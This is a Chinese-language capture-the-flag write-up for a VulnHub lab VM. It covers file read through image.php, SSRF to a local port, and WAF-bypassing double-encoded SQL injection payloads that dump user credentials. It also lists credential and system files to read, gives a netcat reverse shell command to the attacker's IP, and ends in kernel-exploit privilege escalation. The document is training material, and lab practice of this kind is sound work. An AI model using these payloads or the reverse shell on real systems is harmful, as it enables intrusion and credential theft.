@@ -1,0 +1,219 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_Hq1uzyUEqS2t3GvveGQNQ)
+
+下载地址：https://www.vulnhub.com/entry/6days-lab-11%2C156/
+
+靶机描述：
+
+考察 SSRF 、SQL 注入、漏洞提权
+
+信息收集
+
+通过 nmap 扫描获取对方主机开放服务和主机 IP
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfIqHxJHtpMOh1YY8UIicTQGiaibEvOYTNwdxuKhxhv9RoPqKPhgKNONUicA/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfibRdXdv48AB8j8znBjMJPyLBlENxSicWiaxZnar7cRS64u8Pla6WJGI2Q/640?wx_fmt=png)
+
+目标 IP： 192.168.246.159 目标端口： 22，8080
+
+请求 web 应用程序
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfcCnwfrt7y0kkkeKYhibriawscbl0xygqsiaJibLOvnTiaKHlKEzHPicyyiatA/640?wx_fmt=png)
+
+按照使用促销代码 NONEEDFORPENTEST
+
+提示代码过期
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11Hfmo12EbPrs3N2L2PQ4ZQVWgPCsOCxSQV6qdFo0icyLlJSUfgLB8yWRCg/640?wx_fmt=png)
+
+FUZZ 目录
+
+<table valign="top" title="" summary="" cellspacing="0" cellpadding="0"><tbody><tr><td width="0"><p lang="en-US">403</p></td><td width="0"><p lang="en-US">/cgi-bin/</p></td></tr><tr><td width="0"><p lang="en-US">301</p></td><td width="0"><p lang="en-US">/img</p></td></tr></tbody></table>
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfN2ojGf3JS8R5VOq1ia0SkwjqLQAR7CI12NkH0pVsibG9ribFlsz8gSfAw/640?wx_fmt=png)
+
+拿到 apache 的版本 和开放端口
+
+图片打不开，寻找其他突破点
+
+这个地址不在当前网段， 后面发现是环境问题
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11Hfic6uibyxicnE04BqAcd0VGdknjchoqfr7NnglFm7UdZrYmwd96mnO13iag/640?wx_fmt=png)
+
+直接请求链接 可能存在漏洞，尝试 src 指向本地文件，发现存在任意文件读取
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfxpBh5gIc8MpyickQvgE8xYbZmko3Rpsk0buSpHiclVyVsLxnzhia8tk0A/640?wx_fmt=png)
+
+访问 index.php , 查看源码
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfXSBqhxN3btrB393bblS7vibtHicQibj9dlSnLeZibGQDJqzgzRTc3bB94Q/640?wx_fmt=png)
+
+验证折扣码在 checkpromo.php 访问如下链接 获得 checkpromo.php 源码
+
+http://192.168.246.159/image.php?src=checkpromo.php
+
+获取用户账号
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfYdRIeDST1ZhkX7EKpH1OYrljk2014IkPfqE4H5Y0hweErrAJ3jqmPA/640?wx_fmt=png)
+
+数据库密码
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11Hf5hnFl70jNyEV9K3Zh8dU6mHIIQzhElEFqNTltJxK7OodWvjZj7oMLA/640?wx_fmt=png)
+
+分享一个敏感信息目录
+
+敏感信息
+
+Windows：
+
+C:\boot.ini // 查看系统版本
+
+C:\Windows\System32\inetsrv\MetaBase.xml //IIS 配置文件
+
+C:\Windows\repair\sam // 存储系统初次安装的密码
+
+C:\Program Files\mysql\my.ini //Mysql 配置
+
+C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
+
+C:\Windows\php.ini //php 配置信息
+
+C:\Windows\my.ini //Mysql 配置信息
+
+Linux：
+
+/root/.ssh/authorized_keys // 如需登录到远程主机，需要到. ssh 目录下，新建 authorized_keys 文件，并将 id_rsa.pub 内容复制进去
+
+/root/.ssh/id_rsa //ssh 私钥, ssh 公钥是 id_rsa.pub
+
+/root/.ssh/id_ras.keystore // 记录每个访问计算机用户的公钥
+
+/root/.ssh/known_hosts
+
+//ssh 会把每个访问过计算机的公钥 (public key) 都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH 会核对公钥。如果公钥不同，OpenSSH 会发出警告， 避免你受到 DNS Hijack 之类的攻击。
+
+/etc/passwd // 账户信息
+
+/etc/shadow // 账户密码文件
+
+/etc/my.cnf //mysql 配置文件
+
+/etc/httpd/conf/httpd.conf // Apache 配置文件
+
+/root/.bash_history // 用户历史命令记录文件
+
+/root/.mysql_history //mysql 历史命令记录文件
+
+/proc/self/fd/fd[0-9]*(文件标识符)
+
+/proc/mounts // 记录系统挂载设备
+
+/porc/config.gz // 内核配置文件
+
+/var/lib/mlocate/mlocate.db // 全文件路径
+
+/porc/self/cmdline // 当前进程的 cmdline 参数
+
+没有找到可以攻击的点，在重新审计 checkpromo.php 方法，获取的参数 promocode 直接插入了 Sql 语句
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfXKbibVWjWEUGMGth2miavlU1QmuRdVOfpIRQMorEQKX3D6MPAte3R3Qw/640?wx_fmt=png)
+
+尝试闭合
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11Hfrm5IEHhB4VTSJqtOLQLD9VMuQHiabKAAQdto7wibSk3xRibtt42ib82V6w/640?wx_fmt=png)
+
+编码绕过，发现二次 url 编码绕过 waf 检测
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfdTXrLqD3sOSdBsI7Br4W2FQCzWbuq4EA7XRQgEBBLHmxHYWDeic8m5A/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfTvJL54qb6mDFPhVMgYWZCdjgYqCGPnNt1oMEXeAII0K8e9feol5oZQ/640?wx_fmt=png)
+
+绕过 waf 后，直接请求以下链接是没有回显的，
+
+http://192.168.246.159/checkpromo.php?promocode=aa%2527%2520order%2520by%25202%2523
+
+那为什么没有回显，后面看了下 apache 的配置文件发现网站在 8080 端口，只允许本地访问
+
+http://192.168.246.159/image.php?src=/etc/apache2/sites-available/default
+
+注入 POC：
+
+1' order by 2#
+
+http://192.168.246.159/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=1%2527%2520order%2520by%25202%2523
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfVJgqFH5bEXZzRBukyiagpGQ1wwbgoUKOeiad5BpiaOqEgsTibKt9Uibibzjw/640?wx_fmt=png)
+
+1' order by 2#
+
+http://192.168.246.159/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=1%2527%2520order%2520by%25203%2523
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfLLyp5I2f2dGe4nUic6vk0sWCIADxB9GdXtIFfJiaft9Mveoh1NX3zWPQ/640?wx_fmt=png)
+
+1' union select 1,2#
+
+http://192.168.246.159/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=1%2527%2520union%2520select%25201%252C2%2523
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfbQIoNKQaw4IKJ728MsuPdKLGQacAQEsD4ju6zoMPnsjTjTbBjfSMXw/640?wx_fmt=png)
+
+回显位置找到 ，查表
+
+1' union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2#
+
+http://192.168.246.159/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=1%2527%2520union%2520select%2520%2528select%2520group_concat%2528table_name%2529%2520from%2520information_schema.tables%2520where%2520table_schema%253Ddatabase%2528%2529%2529%252C2%2523
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11Hf1ha4QkJUqibRdaNwryUr05tJiaGNhPWCqYycuE9M3xtM8icuE61qlyatw/640?wx_fmt=png)
+
+1' union select (select group_concat(column_name) from information_schema.columns where table_name='users'),2#
+
+http://192.168.246.159/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=1%2527%2520union%2520select%2520%2528select%2520group_concat%2528column_name%2529%2520from%2520information_schema.columns%2520where%2520table_name%253D%2527users%2527%2529%252C2%2523
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfXwAezRktOGDc7Kx8fF5OMAfZQ2XzUN8Nu8XcnuS6lm7Es3J96LBMkQ/640?wx_fmt=png)
+
+1' union select (select group_concat(0x3e,username,0x3e,password) from users),2#
+
+1%2527%2520union%2520select%2520%2528select%2520group_concat%25280x3e%252Cusername%252C0x3e%252Cpassword%2529%2520from%2520users%2529%252C2%2523
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11Hfe0jXehxVVP4icBEsJZgPjNc9Jx38OTd8ib1XliaVEhfpFqwpQ2kV5cuqw/640?wx_fmt=png)
+
+拿到账号：andrea SayNoToPentests  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11Hf4sspJ4GfKx4hofgJqPpRiaCZEZHeEs7uoQQeLGhABBl1KrbsUhSDjvg/640?wx_fmt=png)
+
+无法执行命令，反弹一个 shell
+
+nc -e/bin/bash 192.168.246.158 4444
+
+本地 nc -lvvp 4444  监听
+
+获取交互式 shell
+
+python -c'import pty; pty.spawn("/bin/bash")'
+
+尝试内核版本提权
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfPtWypanJR5EiaNdAHumUtxZrdeIvT5OOiad1o5L0j8eqsE9O0hWE2nuQ/640?wx_fmt=png)
+
+搜索版本号 查找漏洞
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfWxgB1XSfpkLZscDjibzS7hlpPlzHnanfORlnwYj11lBTVO1Csn2iaFOg/640?wx_fmt=png)
+
+把脚本 cp 到 web 目录
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfqBJKpzQs7xicIQgPDdtiaCYwsBiczlTY5hgbF23a1WsssHQicuGKWmiaCxw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11HfDpgY7HywqMyOLXEicNibOrWZyiaLoI0R4gmibUAPtic0TfcwVgribq07Y9AQ/640?wx_fmt=png)
+
+开启 apache2  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11Hfk75fTJ6WEAJ1iaTwAtvR5J4jZlLsZjKeXib7GgJA7icbfvWtibZTohI1Mg/640?wx_fmt=png)
+
+Wget 下载  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11Hf4Zn7BqTN55plh7DSU5hcgReA7acU3CIAeGIlOlqX8yfsmasIM1IZCg/640?wx_fmt=png)
+
+编译并执行
+
+![](https://mmbiz.qpic.cn/mmbiz_png/v6ap3LYR6wic2jrLxgjNpgsIJsic7f11Hfx8UppOHfmlLXSAGLJtaFT4XOza13lOCKeoBjUM2SbfgH3mUmc0Tb5Q/640?wx_fmt=png)
+
+Flag 在根目录下
